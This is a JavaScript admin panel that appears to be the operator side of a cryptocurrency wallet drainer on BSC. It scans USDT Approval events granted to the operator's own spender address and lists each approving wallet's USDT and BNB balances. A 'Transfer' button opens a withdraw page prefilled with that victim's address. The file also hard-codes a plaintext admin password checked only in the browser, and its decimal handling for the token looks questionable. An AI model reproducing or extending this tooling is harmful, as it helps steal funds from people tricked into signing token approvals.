/*************************************************
 * ADMIN.JS – BSC ONLY (RATE-LIMIT SAFE)
 * Shows ONLY users who approved OUR spender
 *************************************************/

/* ================= CONFIG ================= */

const ADMIN_PASSWORD = "Akashankit1@#"; // 🔐 change this

const BSC_RPC = "https://rpc.ankr.com/bsc";

const USDT = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56"; // TokenOperator

/* ================= ABI ================= */

const ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

/* ================= GLOBALS ================= */

let provider;
let usdt;

/* ================= LOGIN ================= */

function login() {
  const pass = document.getElementById("adminPass").value;
  if (pass !== ADMIN_PASSWORD) {
    alert("Wrong password");
    return;
  }
  document.getElementById("loginBox").style.display = "none";
  document.getElementById("adminApp").style.display = "block";
}

/* ================= LOAD APPROVALS (FIXED) ================= */

async function loadApprovedUsers() {
  const tbody = document.getElementById("rows");
  tbody.innerHTML = "";

  provider = new ethers.JsonRpcProvider(BSC_RPC);
  usdt = new ethers.Contract(USDT, ABI, provider);

  const latestBlock = await provider.getBlockNumber();

  // 🔧 SAFE SETTINGS
  const STEP = 5000;                 // blocks per call
  const FROM = Math.max(latestBlock - 100000, 0); // last ~100k blocks

  const latestByUser = new Map(); // owner => latest approval event

  for (let start = FROM; start < latestBlock; start += STEP) {
    const end = Math.min(start + STEP - 1, latestBlock);

    try {
      const events = await usdt.queryFilter(
        usdt.filters.Approval(null, SPENDER),
        start,
        end
      );

      for (const e of events) {
        // overwrite = latest approval per user
        latestByUser.set(e.args.owner, e);
      }

      // ⏳ delay to avoid RPC rate-limit
      await sleep(300);

    } catch (err) {
      console.warn("RPC skipped blocks:", start, end);
      await sleep(800);
    }
  }

  // render table
  for (const [user, e] of latestByUser.entries()) {
    try {
      const [usdtBal, bnbBal] = await Promise.all([
        usdt.balanceOf(user),
        provider.getBalance(user)
      ]);

      addRow(
        user,
        ethers.formatUnits(usdtBal, 6),
        ethers.formatEther(bnbBal),
        ethers.formatUnits(e.args.value, 6),
        e.transactionHash
      );
    } catch (err) {
      console.warn("Balance fetch failed for", user);
    }
  }
}

/* ================= TABLE ROW ================= */

function addRow(user, usdtBal, bnbBal, approved, tx) {
  const tr = document.createElement("tr");

  tr.innerHTML = `
    <td>${user}</td>
    <td>${usdtBal} USDT</td>
    <td>${bnbBal} BNB</td>
    <td>${approved} USDT</td>
    <td>
      <a href="https://bscscan.com/tx/${tx}" target="_blank">
        ${tx.slice(0, 10)}...
      </a>
    </td>
    <td>
      <button class="btn-transfer">Transfer</button>
    </td>
  `;

  // 🔥 Transfer → open withdraw page with auto-fill
  tr.querySelector(".btn-transfer").onclick = (e) => {
    e.stopPropagation();
    window.open(`withdraw.html?from=${user}`, "_blank");
  };

  document.getElementById("rows").appendChild(tr);
}

/* ================= SEARCH ================= */

function filterUsers() {
  const q = document.getElementById("search").value.toLowerCase();
  const rows = document.querySelectorAll("#rows tr");

  rows.forEach(r => {
    r.style.display = r.innerText.toLowerCase().includes(q) ? "" : "none";
  });
}

/* ================= UTIL ================= */

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
